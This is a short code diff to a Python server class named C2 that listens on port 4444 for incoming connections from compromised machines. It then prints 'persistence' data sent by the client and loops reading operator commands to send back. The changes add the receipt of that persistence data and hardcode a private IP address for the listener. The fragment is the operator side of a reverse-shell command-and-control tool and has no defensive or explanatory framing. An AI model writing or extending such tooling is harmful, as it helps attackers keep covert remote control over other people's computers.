@@ -72,6 +72,8 @@ class Server:
         # Maximum no of Unaccepted Connections that can be allowed before the system stops Listening - listen(1)
         self.client_obj, ip_addr = self.sock_obj.accept() 
         print("[+] Recieved a connection from -> "+str(ip_addr))
+        persist_data = self.reliable_receive()
+        print(persist_data)
         while True:
             cmd = input(">> ").split()
             if len(cmd) == 0:
@@ -99,5 +101,5 @@ class Server:
 
 # gets the local IP address of the machine
 IP = socket.gethostname()
-C2 = Server(IP, 4444)
+C2 = Server("10.124.27.174", 4444)
 C2.run()
